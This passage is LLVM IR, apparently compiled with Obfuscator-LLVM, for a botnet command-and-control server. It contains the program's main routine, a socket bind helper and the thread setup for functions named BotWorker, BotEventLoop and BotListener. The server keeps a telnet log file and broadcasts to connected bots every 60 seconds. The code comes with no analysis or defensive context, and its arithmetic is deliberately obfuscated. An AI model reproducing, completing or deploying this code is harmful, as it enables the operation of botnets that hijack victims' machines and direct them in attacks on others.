  %34 = call i32 @accept(i32 %32, %struct.sockaddr* %33, i32* %6)
  store i32 %34, i32* %5, align 4
  %35 = load i32, i32* %5, align 4
  %36 = icmp slt i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %31
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.80, i32 0, i32 0))
  br label %38

; <label>:38:                                     ; preds = %37, %31
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = inttoptr i64 %40 to i8*
  %42 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %41) #7
  br label %31
                                                  ; No predecessors!
  %44 = load i8*, i8** %2, align 8
  ret i8* %44
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %3
  %17 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.81, i32 0, i32 0), i8* %20)
  call void @exit(i32 1) #10
  unreachable

; <label>:22:                                     ; preds = %3
  %23 = load i8**, i8*** %6, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 3
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25) #8
  store i32 %26, i32* %10, align 4
  %27 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0))
  store %struct._IO_FILE* %27, %struct._IO_FILE** @telFD, align 8
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @create_and_bind(i8* %34)
  store volatile i32 %35, i32* @listenFD, align 4
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %22
  call void @abort() #10
  unreachable

; <label>:39:                                     ; preds = %22
  %40 = load volatile i32, i32* @listenFD, align 4
  %41 = call i32 @make_socket_non_blocking(i32 %40)
  store i32 %41, i32* %8, align 4
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  call void @abort() #10
  unreachable

; <label>:45:                                     ; preds = %39
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = call i32 @listen(i32 %46, i32 128) #7
  store i32 %47, i32* %8, align 4
  %48 = load i32, i32* %8, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %45
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:51:                                     ; preds = %45
  %52 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %52, i32* @epollFD, align 4
  %53 = load volatile i32, i32* @epollFD, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %51
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:56:                                     ; preds = %51
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %59 = bitcast %union.epoll_data* %58 to i32*
  store i32 %57, i32* %59, align 1
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %60, align 1
  %61 = load volatile i32, i32* @epollFD, align 4
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = call i32 @epoll_ctl(i32 %61, i32 1, i32 %62, %struct.epoll_event* %11) #7
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* %8, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %56
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:67:                                     ; preds = %56
  %68 = load i32, i32* %9, align 4
  %69 = sub i32 0, 2
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 2
  %72 = zext i32 %70 to i64
  %73 = call i8* @llvm.stacksave()
  store i8* %73, i8** %12, align 8
  %74 = alloca i64, i64 %72, align 16
  br label %75

; <label>:75:                                     ; preds = %82, %67
  %76 = load i32, i32* %9, align 4
  %77 = sub i32 %76, 1015534952
  %78 = add i32 %77, -1
  %79 = add i32 %78, 1015534952
  %80 = add nsw i32 %76, -1
  store i32 %79, i32* %9, align 4
  %81 = icmp ne i32 %76, 0
  br i1 %81, label %82, label %90

; <label>:82:                                     ; preds = %75
  %83 = load i32, i32* %9, align 4
  %84 = sub i32 0, 1
  %85 = sub i32 %83, %84
  %86 = add nsw i32 %83, 1
  %87 = sext i32 %85 to i64
  %88 = getelementptr inbounds i64, i64* %74, i64 %87
  %89 = call i32 @pthread_create(i64* %88, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #7
  br label %75

; <label>:90:                                     ; preds = %75
  %91 = getelementptr inbounds i64, i64* %74, i64 0
  %92 = load i32, i32* %10, align 4
  %93 = sext i32 %92 to i64
  %94 = inttoptr i64 %93 to i8*
  %95 = call i32 @pthread_create(i64* %91, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %94) #7
  br label %96

; <label>:96:                                     ; preds = %97, %90
  br label %97

; <label>:97:                                     ; preds = %96
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0))
  %98 = call i32 @sleep(i32 60)
  br label %96
                                                  ; No predecessors!
  %100 = load i32, i32* %4, align 4
  ret i32 %100
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.88, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %28
  br label %63

; <label>:42:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #7
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #7
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %48
  br label %67

; <label>:60:                                     ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

; <label>:63:                                     ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25

; <label>:67:                                     ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.90, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:73:                                     ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #7
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
